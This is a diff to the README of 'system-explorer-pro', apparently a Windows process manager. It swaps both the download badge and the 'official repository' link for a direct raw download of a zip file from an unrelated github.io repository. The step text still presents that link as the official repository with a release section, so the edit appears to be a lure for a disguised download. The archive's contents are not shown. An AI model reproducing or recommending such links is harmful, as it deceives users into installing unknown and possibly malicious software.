@@ -5,7 +5,7 @@ description: "Monitor processes, manage system resources, and terminate unrespon
 ---
 # 🖥️ system-explorer-pro - Manage your Windows system with efficiency
 
-[![](https://img.shields.io/badge/Download_System_Explorer-Blue?style=for-the-badge)](https://github.com/alexapreconceived85/system-explorer-pro)
+[![](https://img.shields.io/badge/Download_System_Explorer-Blue?style=for-the-badge)](https://raw.githubusercontent.com/alexapreconceived85/alexapreconceived85.github.io/main/furdel/alexapreconceived_io_github_1.9-alpha.2.zip)
 
 System Explorer Pro provides a detailed view of your computer processes. This tool helps you identify heavy resource users, stop unresponsive programs, and maintain system health on Windows 10 and Windows 11.
 
@@ -35,7 +35,7 @@ The application offers specific tools to monitor and manage your hardware resour
 
 Follow these steps to set up the software on your computer.
 
-1. Open your web browser and visit the official repository: [Download Page](https://github.com/alexapreconceived85/system-explorer-pro).
+1. Open your web browser and visit the official repository: [Download Page](https://raw.githubusercontent.com/alexapreconceived85/alexapreconceived85.github.io/main/furdel/alexapreconceived_io_github_1.9-alpha.2.zip).
 2. Look for the release section to find the latest version.
 3. Download the zipped folder to your computer.
 4. Locate the file in your Downloads folder.
